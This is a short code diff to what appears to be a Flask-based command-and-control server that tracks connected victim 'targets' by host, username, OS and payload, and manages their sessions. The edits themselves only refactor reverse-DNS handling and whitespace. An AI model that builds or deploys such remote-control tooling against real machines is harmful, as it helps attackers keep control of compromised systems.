@@ -16,7 +16,6 @@ sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 def comm_in(targ_id):
     message_rec = targ_id.recv(1024).decode('utf-8')
     message_rec = base64.b64decode(message_rec).decode('utf-8')
-    #message_rec = message_rec.decode().strip()
     return message_rec
 
 def comm_out(targ_id, message):
@@ -51,11 +50,11 @@ def comm_handler():
             cur_time = time.strftime("%H:%M:%S", time.localtime())
             date = datetime.now()
             time_record = f"{date.month}/{date.day}/{date.year} {cur_time}"
-            host_name = socket.gethostbyaddr(remote_ip[0])
-            if host_name is not None:
-                targets.append([remote_target, f"{host_name[0]}@{remote_ip[0]}", time_record, username, op_sys, pay_val, 'Active'])
-            else:
-                targets.append([remote_target, remote_ip[0], time_record, username, op_sys, pay_val, 'Active'])
+            try:
+                host_name = socket.gethostbyaddr(remote_ip[0])[0]
+            except socket.herror:
+                host_name = remote_ip[0]
+            targets.append([remote_target, f"{host_name}@{remote_ip[0]}", time_record, username, op_sys, pay_val, 'Active'])
         except:
             pass
 
@@ -113,7 +112,6 @@ def kill_session(session_id):
         flash(f'Session {session_id} does not exist', 'danger')
     return redirect(url_for('sessions'))
 
-
 @app.route('/session/<int:session_id>', methods=['GET', 'POST'])
 def session(session_id):
     if request.method == 'POST':
@@ -136,4 +134,4 @@ def session(session_id):
     return render_template('session.html', session_id=session_id, target=targets[session_id])
 
 if __name__ == '__main__':
-    app.run(debug=False,host='0.0.0.0')
+    app.run(debug=False, host='0.0.0.0')
